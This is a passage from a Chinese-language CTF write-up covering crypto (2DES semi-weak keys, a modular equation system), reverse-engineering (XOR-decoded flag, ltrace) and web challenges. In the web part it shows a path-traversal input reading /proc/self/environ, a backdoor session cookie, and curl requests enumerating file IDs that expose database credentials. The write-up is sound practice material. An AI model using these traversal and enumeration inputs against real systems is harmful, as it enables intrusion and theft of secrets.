class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg: <span class="built_in">bytes</span>, key1, key2</span>):</span><br><span class="line">    des1 = DES.new(key1, DES.MODE_ECB)</span><br><span class="line">    des2 = DES.new(key2, DES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> des2.encrypt(des1.encrypt(pad(msg, des1.block_size)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">'/flag.txt'</span>, <span class="string">'r'</span>).read().strip().encode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"This is a 2DES encryption service."</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"But you can only control one of the key."</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"1. Encrypt flag"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"2. Decrypt flag"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"3. Exit"</span>)</span><br><span class="line">        option = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">"&gt; "</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># I choose a key</span></span><br><span class="line">            <span class="comment"># You can choose another one</span></span><br><span class="line">            keyset = [<span class="string">"1FE01FE00EF10EF1"</span>, <span class="string">"01E001E001F101F1"</span>, <span class="string">"1FFE1FFE0EFE0EFE"</span>]</span><br><span class="line">            key1 = <span class="built_in">bytes</span>.fromhex(choice(keyset))</span><br><span class="line">            key2 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">"Enter key2 (hex): "</span>).strip())</span><br><span class="line"></span><br><span class="line">            ciphertext = encrypt(flag, key1, key2)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Here is your encrypted flag:"</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"..."</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> ciphertext[:<span class="number">4</span>] == flag[:<span class="number">4</span>]:</span><br><span class="line">                <span class="built_in">print</span>(ciphertext)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Hmmm... What a coincidence!"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"System error!"</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Decryption are disabled"</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> option == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Bye!"</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Invalid option"</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>題目是會把 flag 用 DES 加密兩次，第一次是會隨機選擇<code>["1FE01FE00EF10EF1", "01E001E001F101F1", "1FFE1FFE0EFE0EFE"]</code>其中一組當作金鑰加密，第二次加密的金鑰可以自己設定，於是我就想到了<code>半弱金鑰</code>，查了以下這樣的東西，發現三個都是半弱金鑰，我就拿一個去試了，然後就得到flag 了 /</p><ul><li>0x011F011F010E010E and 0x1F011F010E010E01</li><li>0x01E001E001F101F1 and 0xE001E001F101F101</li><li>0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01</li><li>0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E</li><li>0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E</li><li>0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. Encrypt flag</span><br><span class="line">2. Decrypt flag</span><br><span class="line">3. Exit</span><br><span class="line">&gt; 1</span><br><span class="line">Enter key2 (hex): E01FE01FF10EF10E</span><br><span class="line">Here is your encrypted flag:</span><br><span class="line">...</span><br><span class="line">b'TSC{th3_Key_t0_br34k_DES_15_tHe_keY}\x04\x04\x04\x04'</span><br><span class="line">Hmmm... What a coincidence!</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{th3_Key_t0_br34k_DES_15_tHe_keY}</code></p><h3 id="我從來都不覺得算密碼學開心過">我從來都不覺得算密碼學開心過 <a href="#我從來都不覺得算密碼學開心過" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>).read().strip().encode()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">16</span>)</span><br><span class="line">r = [randrange(<span class="number">1</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'p = <span class="subst">{p}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># You have 5 unknown random numbers</span></span><br><span class="line"><span class="comment"># But you can only get 4 hashes</span></span><br><span class="line"><span class="comment"># It is impossible to recover the flag, right?</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    h = flag[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        h = (h + (j+<span class="number">1</span>) * r[j]) % p</span><br><span class="line">        r[j] = h</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"hash[<span class="subst">{i}</span>] = <span class="subst">{h}</span>"</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> rr <span class="keyword">in</span> r:</span><br><span class="line">    key += rr</span><br><span class="line">    key *= <span class="number">2</span>**<span class="number">16</span></span><br><span class="line"></span><br><span class="line">key = pad(long_to_bytes(key), <span class="number">16</span>)</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">ciphertext = aes.encrypt(pad(flag, AES.block_size))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"ciphertext = <span class="subst">{ciphertext}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><p>簡單來說就是他有 r0~r4五個未知數，但是他只有四個取模的等式，所以我們枚舉其中一項，就能推出剩下四項，然後帶去解AES 看解不解的出來，解出來就對了，但是實際上那個等式超醜，我是用Geogebra 算，還是算了好一陣子才寫出正確的等式，如下</p><p><span class="math display">\[\begin{cases}r_0 + 2r_1 + 3r_2 + 4r_3 + 5r_4 + 84 \equiv 1934 \pmod{42899} \\15r_0 + 28r_1 + 36r_2 + 36r_3 + 25r_4 + 1343 \equiv 22627 \pmod{42899}\\140r_0 + 250r_1 + 291r_2 + 244r_3 + 125r_4 + 13072 \equiv 36616\pmod{42899} \\1050r_0 + 1820r_1 + 1980r_2 + 1476r_3 + 625r_4 + 100948 \equiv 21343\pmod{42899}\end{cases}\]</span></p><p>然後叫 ChatGPT 幫我寫個求解的程式碼，然後就依依帶入驗證就可以得到Flag 了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">p = <span class="number">42899</span></span><br><span class="line">hashes = [<span class="number">1934</span>, <span class="number">22627</span>, <span class="number">36616</span>, <span class="number">21343</span>]</span><br><span class="line">ciphertext = <span class="string">b'z\xa5\xa5\x1d\xe5\xd2I\xb1\x15\xec\x95\x8b^\xb6:r=\xe3h\x06-\xe9\x01\xda\xc03\xa4\xf6\xa8_\x8c\x12!MZP\x17O\xee\xa3\x0f\x05\x0b\xea7cnP'</span></span><br><span class="line"></span><br><span class="line">good = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r4 <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">    A = Matrix([</span><br><span class="line">        [<span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>],</span><br><span class="line">        [<span class="number">15</span>, <span class="number">28</span>, <span class="number">36</span>, <span class="number">36</span>],</span><br><span class="line">        [<span class="number">140</span>, <span class="number">250</span>, <span class="number">291</span>, <span class="number">244</span>],</span><br><span class="line">        [<span class="number">1050</span>,<span class="number">1820</span>,<span class="number">1980</span>,<span class="number">1476</span>]</span><br><span class="line">    ])</span><br><span class="line">    B = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mod_sub</span>(<span class="params">a, b</span>): <span class="keyword">return</span> (a - b) % p</span><br><span class="line">    </span><br><span class="line">    B.append(mod_sub(hashes[<span class="number">0</span>], <span class="number">5</span>*r4 + <span class="number">84</span>))</span><br><span class="line">    B.append(mod_sub(hashes[<span class="number">1</span>], <span class="number">25</span>*r4 + <span class="number">1343</span>))</span><br><span class="line">    B.append(mod_sub(hashes[<span class="number">2</span>], <span class="number">125</span>*r4 + <span class="number">13072</span>))</span><br><span class="line">    B.append(mod_sub(hashes[<span class="number">3</span>], <span class="number">625</span>*r4 + <span class="number">100948</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve in modular arithmetic</span></span><br><span class="line">    <span class="comment"># sympy's solve for modular is not direct; try invert or reduce:</span></span><br><span class="line">    M = A.det() % p</span><br><span class="line">    <span class="keyword">if</span> M == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        invA = A.inv_mod(p)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sol = invA * Matrix(B)</span><br><span class="line">    r0, r1, r2, r3 = [<span class="built_in">int</span>(x) % p <span class="keyword">for</span> x <span class="keyword">in</span> sol]</span><br><span class="line"></span><br><span class="line">    r = [r0, r1, r2, r3, r4]</span><br><span class="line">    flag = <span class="string">'TSC{}'</span>.encode()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        h = flag[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            h = (h + (j+<span class="number">1</span>) * r[j]) % p</span><br><span class="line">            r[j] = h</span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> rr <span class="keyword">in</span> r:</span><br><span class="line">        key += rr</span><br><span class="line">        key *= <span class="number">2</span>**<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    key = pad(long_to_bytes(key), <span class="number">16</span>)</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted = aes.decrypt(ciphertext).decode()</span><br><span class="line">        <span class="keyword">if</span> decrypted.startswith(<span class="string">'TSC{'</span>):</span><br><span class="line">            <span class="built_in">print</span>(decrypted)</span><br><span class="line">            <span class="built_in">print</span>(r0, r1, r2, r3, r4)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{d0_4_L1feTim3_0f_crypTogr4phy_w1th_yOu}</code></p><h2 id="reverse">Reverse <a href="#reverse" class="headerlink"></a></h2><h3 id="what_happened">What_Happened <a href="#what_happened" class="headerlink"></a></h3><p>用 gdb 得到了者個咚咚</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s &amp;flag_encrypted</span><br><span class="line">0x405064 &lt;flag_encrypted&gt;:      "\376\371\351\321\343\365\376\302\303\304\301\365\323\305\337\365\354\303\322\365\230\305\307\317\365\231\330\330\305\330\327Decrypted Flag: %s\n"</span><br></pre></td></tr></tbody></table></figure><p>然後看了一下 decrypt 的邏輯</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble decrypt_flag</span><br><span class="line">Dump of assembler code for function decrypt_flag:</span><br><span class="line">   0x004014af &lt;+0&gt;:     push   %ebp</span><br><span class="line">   0x004014b0 &lt;+1&gt;:     mov    %esp,%ebp</span><br><span class="line">   0x004014b2 &lt;+3&gt;:     sub    $0x58,%esp</span><br><span class="line">   0x004014b5 &lt;+6&gt;:     movl   $0x405064,(%esp)</span><br><span class="line">   0x004014bc &lt;+13&gt;:    call   0x403b28 &lt;strlen&gt;</span><br><span class="line">   0x004014c1 &lt;+18&gt;:    mov    %eax,-0x10(%ebp)</span><br><span class="line">   0x004014c4 &lt;+21&gt;:    movl   $0x0,-0xc(%ebp)</span><br><span class="line">   0x004014cb &lt;+28&gt;:    jmp    0x4014eb &lt;decrypt_flag+60&gt;</span><br><span class="line">   0x004014cd &lt;+30&gt;:    mov    -0xc(%ebp),%eax</span><br><span class="line">   0x004014d0 &lt;+33&gt;:    add    $0x405064,%eax</span><br><span class="line">   0x004014d5 &lt;+38&gt;:    movzbl (%eax),%eax</span><br><span class="line">   0x004014d8 &lt;+41&gt;:    xor    $0xffffffaa,%eax</span><br><span class="line">   0x004014db &lt;+44&gt;:    mov    %eax,%ecx</span><br><span class="line">   0x004014dd &lt;+46&gt;:    lea    -0x42(%ebp),%edx</span><br><span class="line">   0x004014e0 &lt;+49&gt;:    mov    -0xc(%ebp),%eax</span><br><span class="line">   0x004014e3 &lt;+52&gt;:    add    %edx,%eax</span><br><span class="line">   0x004014e5 &lt;+54&gt;:    mov    %cl,(%eax)</span><br><span class="line">   0x004014e7 &lt;+56&gt;:    addl   $0x1,-0xc(%ebp)</span><br><span class="line">   0x004014eb &lt;+60&gt;:    mov    -0xc(%ebp),%eax</span><br><span class="line">   0x004014ee &lt;+63&gt;:    cmp    -0x10(%ebp),%eax</span><br><span class="line">   0x004014f1 &lt;+66&gt;:    jl     0x4014cd &lt;decrypt_flag+30&gt;</span><br><span class="line">   0x004014f3 &lt;+68&gt;:    lea    -0x42(%ebp),%edx</span><br><span class="line">   0x004014f6 &lt;+71&gt;:    mov    -0x10(%ebp),%eax</span><br><span class="line">   0x004014f9 &lt;+74&gt;:    add    %edx,%eax</span><br><span class="line">   0x004014fb &lt;+76&gt;:    movb   $0x0,(%eax)</span><br><span class="line">   0x004014fe &lt;+79&gt;:    lea    -0x42(%ebp),%eax</span><br><span class="line">   0x00401501 &lt;+82&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x00401505 &lt;+86&gt;:    movl   $0x405083,(%esp)</span><br><span class="line">--Type &lt;RET&gt; for more, q to quit, c to continue without paging--c</span><br><span class="line">   0x0040150c &lt;+93&gt;:    call   0x403b60 &lt;printf&gt;</span><br><span class="line">   0x00401511 &lt;+98&gt;:    nop</span><br><span class="line">   0x00401512 &lt;+99&gt;:    leave</span><br><span class="line">   0x00401513 &lt;+100&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>可是我看不懂，不過 ChatGPT 跟我說他是把每個字拿去跟 <code>0x44</code>xor 的結果，試了一下就得到 flag 了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">encrypted_flag = [</span><br><span class="line">    <span class="number">0xFE</span>, <span class="number">0xF9</span>, <span class="number">0xE9</span>, <span class="number">0xD1</span>, <span class="number">0xE3</span>, <span class="number">0xF5</span>, <span class="number">0xFE</span>, <span class="number">0xC2</span>, <span class="number">0xC3</span>, <span class="number">0xC4</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0xF5</span>, <span class="number">0xD3</span>, <span class="number">0xC5</span>, <span class="number">0xDF</span>, <span class="number">0xF5</span>, <span class="number">0xEC</span>, <span class="number">0xC3</span>, <span class="number">0xD2</span>, <span class="number">0xF5</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0xC5</span>, <span class="number">0xC7</span>, <span class="number">0xCF</span>, <span class="number">0xF5</span>, <span class="number">0x99</span>, <span class="number">0xD8</span>, <span class="number">0xD8</span>, <span class="number">0xC5</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0xD7</span></span><br><span class="line">]</span><br><span class="line">key = <span class="number">0xAA</span></span><br><span class="line">decrypted_flag = <span class="string">''</span>.join(<span class="built_in">chr</span>(byte ^ key) <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_flag)</span><br><span class="line"><span class="built_in">print</span>(decrypted_flag)</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{I_Think_you_Fix_2ome_3rror}</code></p><h3 id="gateway-to-the-reverse">Gateway to the Reverse <a href="#gateway-to-the-reverse" class="headerlink"></a></h3><p>隨便亂帶工具試試看，我根本不會 Reverse 就出 flag 了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ ltrace ./gate</span><br><span class="line">puts("================================"...=============================================</span><br><span class="line">)                                                                                   = 46</span><br><span class="line">puts("You stand before the Gate of the"...You stand before the Gate of the Reverse World.</span><br><span class="line">)                                                                                   = 48</span><br><span class="line">puts("A voice echoes from the darkness"...A voice echoes from the darkness:</span><br><span class="line"></span><br><span class="line">)                                                                                   = 35</span><br><span class="line">puts("  "Beyond this gate lies the Rev"...  "Beyond this gate lies the Reverse World, a realm</span><br><span class="line">)                                                                                   = 52</span><br><span class="line">puts("   of infinite knowledge and unt"...   of infinite knowledge and untold secrets.</span><br><span class="line">)                                                                                   = 45</span><br><span class="line">puts("   But only those who can deciph"...   But only those who can decipher the key may enter."</span><br><span class="line"></span><br><span class="line">)                                                                                   = 56</span><br><span class="line">puts("The gatekeeper continues:"The gatekeeper continues:</span><br><span class="line">)                                                                                             = 26</span><br><span class="line">puts("  "Reveal today's lucky number, "...  "Reveal today's lucky number, and the gate shall open."</span><br><span class="line">)                                                                                   = 58</span><br><span class="line">puts("================================"...=============================================</span><br><span class="line">)                                                                                   = 46</span><br><span class="line">printf("\nEnter the access key: "</span><br><span class="line">)                                                                                            = 23</span><br><span class="line">__isoc99_scanf(0x562eca2c637c, 0x7ffc3c3130b0, 0, 0x562eca2c637bEnter the access key: sadfsd</span><br><span class="line">)                                                             = 1</span><br><span class="line">strlen("NL=rje+fS&amp;eVP!RdK\177=e;{y6CG4Aif")                                                                                   = 30</span><br><span class="line">strcmp("sadfsd", "TSC{th1s_1s_b4by_r3v3rs3_b4by}")                                                                            = 31</span><br><span class="line">puts("  +===========================+"  +===========================+</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||                         ||"  ||                         ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||      [  LOCKED  ]       ||"  ||      [  LOCKED  ]       ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||                         ||"  ||                         ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||   The gate remains      ||"  ||   The gate remains      ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||       firmly shut.      ||"  ||       firmly shut.      ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||                         ||"  ||                         ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  +===========================+"  +===========================+</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("The gatekeeper's voice booms:"The gatekeeper's voice booms:</span><br><span class="line">)                                                                                         = 30</span><br><span class="line">puts("  "Your answer is incorrect. The"...  "Your answer is incorrect. The gate shall remain closed."</span><br><span class="line">)                                                                                   = 60</span><br><span class="line">puts("  "Return when you have decipher"...  "Return when you have deciphered the true key."</span><br><span class="line">)                                                                                   = 50</span><br><span class="line">+++ exited (status 0) +++</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{th1s_1s_b4by_r3v3rs3_b4by}</code></p><h2 id="web">Web <a href="#web" class="headerlink"></a></h2><h3 id="ave-mujica">Ave Mujica <a href="#ave-mujica" class="headerlink"></a></h3><p>發現這題可以在 <code>/image?name=</code> Path Traversal 試了很久，在<code>../../../proc/self/environ</code> 找到了 Flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=acfe70c044b5FLAG=TSC{敬愛爽🍷}LANG=C.UTF-8GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305PYTHON_VERSION=3.12.8PYTHON_SHA256=c909157bb25ec114e5869124cc2a9c4a4d4c1e957ca4ff553f1edc692101154eHOME=/root</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{敬愛爽🍷}</code></p><h3 id="be_idol">Be_IDol <a href="#be_idol" class="headerlink"></a></h3><p>檢查之後發現裡面有個後門</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Backdoor function - ez_login()</span><br><span class="line">function ez_login() {</span><br><span class="line">document.cookie = "PHPSESSID=secretbackdoor123";</span><br><span class="line">location.reload();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>就在 console 中打 <code>ex_login()</code> 之後就到了<code>http://172.31.0.2:8057/index.php</code> 發現有很多檔案可以下載</p><figure><img data-src="https://hackmd.io/_uploads/ByXXZPMPJl.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>通靈試試看上面沒有的 ID</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://172.31.0.2:8057/download.php\?file_id\=11001</span><br><span class="line">database:</span><br><span class="line">  host: localhost</span><br><span class="line">  user: admin</span><br><span class="line">  password: [REDACTED]</span><br></pre></td></tr></tbody></table></figure><p>發現了非預期的結果，於是我叫 GPT 寫了個程式幫我遍歷 id = 